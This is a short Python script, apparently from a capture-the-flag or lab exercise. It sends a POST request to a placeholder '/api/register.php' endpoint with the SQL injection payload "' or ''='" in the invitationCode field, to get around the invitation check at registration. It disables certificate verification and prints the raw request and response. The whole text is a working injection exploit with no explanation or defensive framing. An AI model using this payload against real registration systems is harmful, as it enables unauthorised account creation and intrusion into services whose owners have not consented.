import requests
from urllib.parse import urlparse

# Inputs:
url = 'https://<ip>/api/register.php'
usr = 'name'
passwd = 'Passwd#12'
inj = "' or ''='"
cookie = {'PHPSESSID': '<cookie>'}

# Request body
data = (
	f'username={usr}&'
	f'password={passwd}&'
	f'repeatPassword={passwd}&'
	f'invitationCode={inj}'
)

# POST request
print(f'Sending POST request to: {url}')
r = requests.post(
	url=url,
	headers={"Content-Type": "application/x-www-form-urlencoded"},
	data=data,
	cookies=cookie,
	verify=False, # Ignore SSL Cert
	allow_redirects=False
)
# Request
print('\n***** Request *****')
print(f'{r.request.method} {urlparse(r.request.url).path} HTTP/1.1')
print(f'Host: {urlparse(r.request.url).netloc}')
for k, v in r.request.headers.items():
	print(f'{k}: {v}')
print(f'\n{r.request.body}')

# Responce
print('\n***** Response *****')
print(f'Status Code: {r.status_code} {r.reason}')
for k, v in r.headers.items():
	print(f'{k}: {v}')
print(f'Response-Length: {len(r.content):,}')

